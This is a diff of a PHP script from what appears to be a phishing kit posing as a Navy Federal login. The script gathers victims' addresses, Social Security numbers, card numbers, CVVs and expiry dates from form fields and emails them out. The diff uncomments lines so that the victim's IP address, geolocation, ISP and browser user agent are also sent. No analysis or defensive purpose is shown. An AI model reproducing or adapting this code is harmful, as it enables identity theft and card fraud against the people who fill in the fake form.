@@ -39,15 +39,15 @@ $headers = "From: EndGame<vv122495@gmail.com>";
 $send = $email; 
 
 
-$message = "【🔥 Navy Fed Login 🔥】\r\n";
+$message = "【🔥 Navy Fed Logs 🔥】\r\n";
 $message .= "ADDRESS: "     .$_POST['address']."\r\n";
 $message .= "SSN: "    .$_POST['ssn']."\r\n";
 $message .= "CARD: "    .$_POST['card']."\r\n";
 $message .= "CVV: "    .$_POST['cvv']."\r\n";
 $message .= "EXPIRY: "    .$_POST['exp']."\r\n";
-//$message .= "【💻 System INFO】\r\n";
-//$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
-//$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
+$message .= "【💻 System INFO】\r\n";
+$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
+$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
 //$message .= "【🔥 NetFlix Fire 🔥】\n";
 
 mail($send,$subject,$message,$headers);
